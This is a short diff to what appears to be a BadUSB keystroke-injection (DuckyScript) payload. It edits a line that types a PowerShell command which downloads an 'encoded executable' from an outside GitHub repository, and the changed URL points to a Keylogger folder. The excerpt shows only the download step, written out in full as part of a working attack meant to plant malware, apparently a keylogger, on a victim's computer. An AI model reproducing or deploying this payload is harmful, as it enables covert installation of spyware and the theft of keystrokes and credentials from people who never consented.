@@ -7,7 +7,7 @@ DELAY 1000
 
 
 REM Download encoded executable
-STRING $url='https://raw.githubusercontent.com/Chrislundh98/BadUSB/main/encoded-20240308210244.txt'; $out='encoded-20240308210244.txt'; Invoke-WebRequest -Uri $url -OutFile $out
+STRING $url='https://github.com/Chrislundh98/BadUSB/blob/main/Keylogger/encoded-20240308210244.txt'; $out='encoded-20240308210244.txt'; Invoke-WebRequest -Uri $url -OutFile $out
 ENTER
 DELAY 1000
 
